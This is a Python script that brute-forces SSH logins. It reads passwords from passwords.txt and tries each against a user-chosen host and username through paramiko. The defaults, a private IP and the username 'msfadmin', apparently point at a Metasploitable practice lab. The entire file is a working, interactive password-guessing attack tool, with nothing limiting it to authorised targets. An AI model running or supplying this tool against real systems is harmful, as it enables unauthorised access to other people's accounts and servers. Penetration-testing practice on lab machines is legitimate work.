import socket, paramiko, time

PASSWORDS_FILE = 'passwords.txt'
DEFAULT_HOST = '192.168.50.101'
DEFAULT_PORT = 22
DEFAULT_USERNAME = 'msfadmin'

same_host = False
host = ''
port = 0
username = ''

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def askTarget():
    global same_host, host, port, username

    while True:
        if not same_host:
            host = input("IP target: ").strip() or DEFAULT_HOST
            port = input("Port (default = 22): ").strip() or DEFAULT_PORT
            port = int(port) if port else DEFAULT_PORT

        username = input("Username: ").strip() or DEFAULT_USERNAME
        same_host = True

        print(f"\n(TARGET = {host}:{port}, USERNAME = {username})\n")

        while True:
            choice = input("[1] Proceed\n[2] Change Target\n[3] Change Username\n").strip()
            if choice == '1':
                return
            elif choice == '2':
                same_host = False
            elif choice == '3':
                same_host = True
            else:
                continue
            break

def tryBruteForce():
    global host, port, username

    for pwd in pwd_list:
        pwd = pwd.strip()
        try:
            ssh.connect(hostname=host, port=port, username=username, password=pwd, timeout=5)
            ssh.close()
            return pwd
        except paramiko.AuthenticationException:
            time.sleep(.5)
            continue
        except socket.gaierror as e:
            print(f"Socket error: {e}. Check host/IP resolution.")
            break
        except Exception as e:
            print(f"Unexpected error: {e}")
            break

    return False

if __name__ == "__main__":
    print(f"Python SSH Bruteforce using {PASSWORDS_FILE} as Passwords List")

    try:
        with open(PASSWORDS_FILE) as f:
            pwd_list = f.readlines()
    except FileNotFoundError:
        print(f"Error: The file '{PASSWORDS_FILE}' was not found.")
        exit(1)
    except IOError as e:
        print(f"Error reading the file '{PASSWORDS_FILE}': {e}")
        exit(1)

    while True:
        askTarget()

        print("SSH BRUTEFORCE STARTED...\n")

        start_time = time.time()
        result = tryBruteForce()
        execution_time = time.time() - start_time

        if result:
            print(f"Password found for {username}: '{result}'. In {int(execution_time)} seconds\n")
        else:
            print(f"Sorry, password not found for {username}\n")

        while True:
            choice = input("[1] Change Target\n[2] Change Username\n[3] Quit\n").strip()
            if choice == '1':
                same_host = False
            elif choice == '2':
                same_host = True
            elif choice == '3':
                exit(1)
            else:
                continue
            break